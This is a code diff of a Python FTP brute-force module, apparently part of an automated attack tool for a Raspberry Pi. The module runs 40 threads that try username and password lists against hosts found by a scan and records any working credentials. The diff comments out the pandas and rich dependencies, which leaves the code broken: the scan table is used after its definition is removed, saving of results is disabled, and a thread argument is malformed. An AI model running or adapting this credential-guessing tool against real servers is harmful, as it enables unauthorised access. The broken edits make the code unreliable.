@@ -1,10 +1,10 @@
 import os
-import pandas as pd
+# import pandas as pd
 import threading
 import logging
 import time
-from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
+# from rich.console import Console
+# from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from ftplib import FTP
 from queue import Queue
 from shared import SharedData
@@ -32,7 +32,7 @@ class FTPBruteforce:
         Initiates the brute force attack on the given IP and port.
         """
         return self.ftp_connector.run_bruteforce(ip, port)
-    
+
     def execute(self, ip, port, row, status_key):
         """
         Executes the brute force attack and updates the shared data status.
@@ -50,10 +50,10 @@ class FTPConnector:
     """
     def __init__(self, shared_data):
         self.shared_data = shared_data
-        self.scan = pd.read_csv(shared_data.netkbfile)
+        # self.scan = pd.read_csv(shared_data.netkbfile)
 
-        if "Ports" not in self.scan.columns:
-            self.scan["Ports"] = None
+        # if "Ports" not in self.scan.columns:
+        #     self.scan["Ports"] = None
         self.scan = self.scan[self.scan["Ports"].str.contains("21", na=False)]
 
         self.users = open(shared_data.usersfile, "r").read().splitlines()
@@ -65,9 +65,9 @@ class FTPConnector:
             logger.info(f"File {self.ftpfile} does not exist. Creating...")
             with open(self.ftpfile, "w") as f:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
-        self.results = []  
+        self.results = []
         self.queue = Queue()
-        self.console = Console()
+        # self.console = Console()
 
     def load_scan_file(self):
         """
@@ -93,7 +93,7 @@ class FTPConnector:
         except Exception as e:
             return False
 
-    def worker(self, progress, task_id, success_flag):
+    def worker(self, success_flag):
         """
         Worker thread to process items in the queue.
         """
@@ -107,11 +107,10 @@ class FTPConnector:
                 with self.lock:
                     self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                     logger.success(f"Found credentials for IP: {adresse_ip} | User: {user}")
-                    self.save_results()
-                    self.removeduplicates()
+                    # self.save_results()
+                    # self.removeduplicates()
                     success_flag[0] = True
             self.queue.task_done()
-            progress.update(task_id, advance=1)
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
@@ -120,7 +119,7 @@ class FTPConnector:
         hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
 
         total_tasks = len(self.users) * len(self.passwords) + 1  # Include one for the anonymous attempt
-        
+
         for user in self.users:
             for password in self.passwords:
                 if self.shared_data.orchestrator_should_exit:
@@ -131,26 +130,25 @@ class FTPConnector:
         success_flag = [False]
         threads = []
 
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-            task_id = progress.add_task("[cyan]Bruteforcing FTP...", total=total_tasks)
+        # with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
 
-            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
-                t.start()
-                threads.append(t)
+        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+            t = threading.Thread(target=self.worker, args=(success_flag))
+            t.start()
+            threads.append(t)
 
-            while not self.queue.empty():
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
-                    break
+        while not self.queue.empty():
+            if self.shared_data.orchestrator_should_exit:
+                logger.info("Orchestrator exit signal received, stopping bruteforce.")
+                while not self.queue.empty():
+                    self.queue.get()
+                    self.queue.task_done()
+                break
 
-            self.queue.join()
+        self.queue.join()
 
-            for t in threads:
-                t.join()
+        for t in threads:
+            t.join()
 
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
@@ -175,15 +173,15 @@ if __name__ == "__main__":
     try:
         ftp_bruteforce = FTPBruteforce(shared_data)
         logger.info("[bold green]Starting FTP attack...on port 21[/bold green]")
-        
+
         # Load the IPs to scan from shared data
         ips_to_scan = shared_data.read_data()
-        
+
         # Execute brute force attack on each IP
         for row in ips_to_scan:
             ip = row["IPs"]
             ftp_bruteforce.execute(ip, b_port, row, b_status)
-        
+
         logger.info(f"Total successful attempts: {len(ftp_bruteforce.ftp_connector.results)}")
         exit(len(ftp_bruteforce.ftp_connector.results))
     except Exception as e:
